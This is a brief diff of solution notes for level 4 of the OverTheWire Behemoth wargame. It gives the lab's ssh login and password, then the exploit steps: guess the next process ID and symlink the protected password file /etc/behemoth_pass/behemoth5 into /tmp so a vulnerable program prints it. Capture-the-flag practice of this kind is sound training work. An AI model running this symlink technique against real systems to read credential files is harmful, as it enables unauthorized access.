@@ -1,2 +1,8 @@
 ssh -p 2221 behemoth4@behemoth.labs.overthewire.org
 pass: ietheishei
+
+# Get the PID counter
+echo hey &
+
+# Create a symbolic link to the file that is to be printed by the program
+ln -s /etc/behemoth_pass/behemoth5 /tmp/<PID>
